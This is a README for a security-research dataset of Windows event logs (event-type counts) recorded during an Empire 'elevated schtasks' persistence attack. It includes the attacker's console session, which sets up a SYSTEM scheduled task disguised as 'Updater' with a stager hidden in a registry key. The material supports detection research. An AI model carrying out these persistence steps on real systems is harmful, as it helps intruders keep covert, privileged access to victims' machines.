# Empire Elevated Scheduled Tasks

An adversary can create scheduled tasks to maintain persistence in the environment.

## Technique(s) ID

T1053

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_elevated_schtasks.tar.gz](./empire_elevated_schtasks.tar.gz)

## Network Environment

Shire

## Time Taken

2019-05-18184109

## About this file

| log_name                                 | source_name                         | task                                                   |   record_number |
|------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                       | PowerShell                          | Pipeline Execution Details                             |             253 |
| Security                                 | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |              99 |
| Security                                 | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |              57 |
| Security                                 | Microsoft-Windows-Security-Auditing | Registry                                               |              20 |
| Security                                 | Microsoft-Windows-Security-Auditing | Group Membership                                       |               5 |
| Security                                 | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |               5 |
| Security                                 | Microsoft-Windows-Security-Auditing | Logoff                                                 |               5 |
| Security                                 | Microsoft-Windows-Security-Auditing | Logon                                                  |               5 |
| Security                                 | Microsoft-Windows-Security-Auditing | Process Termination                                    |               5 |
| Security                                 | Microsoft-Windows-Security-Auditing | Special Logon                                          |               5 |
| Security                                 | Microsoft-Windows-Security-Auditing | File Share                                             |               2 |
| Security                                 | Microsoft-Windows-Security-Auditing | Other Object Access Events                             |               2 |
| Security                                 | Microsoft-Windows-Security-Auditing | Process Creation                                       |               2 |
| Security                                 | Microsoft-Windows-Security-Auditing | Detailed File Share                                    |               1 |
| Security                                 | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |               1 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |             328 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |              91 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |              58 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |              22 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              20 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |               6 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |               5 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |               4 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Pipe Created (rule: PipeEvent)                         |               1 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |               1 |
| Microsoft-Windows-PowerShell/Operational | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |             211 |

## Attacker Activity

```
(Empire: TKV35P8X) > usemodule persistence/elevated/schtasks*
(Empire: powershell/persistence/elevated/schtasks) > info

              Name: Invoke-Schtasks
            Module: powershell/persistence/elevated/schtasks
        NeedsAdmin: True
         OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
   OutputExtension: None

Authors:
  @mattifestation
  @harmj0y

Description:
  Persist a stager (or script) using schtasks running as
  SYSTEM. This has a moderate detection/removal rating.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Pe
  rsistence/Persistence.psm1

Options:

  Name       Required    Value                     Description
  ----       --------    -------                   -----------
  DailyTime  False       09:00                     Daily time to trigger the script        
                                                   (HH:mm).                                
  OnLogon    False                                 Switch. Trigger script on user logon.   
  ExtFile    False                                 Use an external file for the payload    
                                                   instead of a stager.                    
  ProxyCreds False       default                   Proxy credentials                       
                                                   ([domain\]username:password) to use for 
                                                   request (default, none, or other).      
  Cleanup    False                                 Switch. Cleanup the trigger and any     
                                                   script from specified location.         
  TaskName   True        Updater                   Name to use for the schtask.            
  IdleTime   False                                 User idle time (in minutes) to trigger  
                                                   script.                                 
  ADSPath    False                                 Alternate-data-stream location to store 
                                                   the script code.                        
  Agent      True        TKV35P8X                  Agent to run module on.                 
  Listener   False                                 Listener to use.                        
  RegPath    False       HKLM:\Software\Microsoft  Registry location to store the script   
                         \Network\debug            code. Last element is the key name.     
  Proxy      False       default                   Proxy to use for request (default, none,
                                                   or other).                              
  UserAgent  False       default                   User-agent string to use for the staging
                                                   request (default, none, or other).      

(Empire: powershell/persistence/elevated/schtasks) > set Listener https
(Empire: powershell/persistence/elevated/schtasks) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked TKV35P8X to run TASK_CMD_WAIT
[*] Agent TKV35P8X tasked with task ID 2
[*] Tasked agent TKV35P8X to run module powershell/persistence/elevated/schtasks
(Empire: powershell/persistence/elevated/schtasks) > SUCCESS: The scheduled task "Updater" has successfully been created.
Schtasks persistence established using listener https stored in HKLM:\Software\Microsoft\Network\debug with Updater daily trigger at 09:00.

(Empire: powershell/persistence/elevated/schtasks) > 
(Empire: powershell/persistence/elevated/schtasks) >
```